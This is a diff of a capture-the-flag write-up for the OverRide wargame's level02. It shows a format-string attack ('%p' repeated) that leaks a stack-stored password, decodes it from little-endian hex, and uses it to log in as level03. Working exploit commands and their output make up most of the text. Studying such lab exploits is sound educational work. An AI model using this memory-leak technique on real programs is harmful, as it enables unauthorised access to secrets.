@@ -21,15 +21,22 @@ level02@OverRide:~$ python -c 'print("AAAA" + " %p"*60)' | ./level02
 --[ Username: --[ Password: *****************************************
 AAAA 0x7fffffffe500 (nil) 0x70 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6f8 0x1f7ff9a08 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025 (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d 0xfeff00 0x2070252041414141 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!
 ```
+
 So the 2a equal * and "207025" is our payload : " %p".
 Then we can search for a string that is 40 char long and have a \0 at the end. 
-We have this thing "0xfeff00" that looks like a null bite and before it we have 
+We have this thing "0xfeff00" that looks like a null bite and before we have 
 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d that is exactly 40 char long. If we convert to str :
 "unPR47hH" + "EAJ5as9Q" + "7zqCWNgX" + "5J5hnGXs" + "H3gPfK9M". But actually we want the reverse of this because of little endian. 
-let's try this : 
-python -c 'print("unPR47hH"[::-1] + "EAJ5as9Q"[::-1] + "7zqCWNgX"[::-1] + "5J5hnGXs"[::-1] + "H3gPfK9M"[::-1])'
 
+let's try this : 
+```sh
 python -c 'print("unPR47hH"[::-1] + "EAJ5as9Q"[::-1] + "7zqCWNgX"[::-1] + "5J5hnGXs"[::-1] + "H3gPfK9M"[::-1])'
 Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+level02@OverRide:~$ su level03
+Password: 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   /home/users/level03/level03
+level03@OverRide:~$ 
+```
 
 ET VOILA we have our flag.
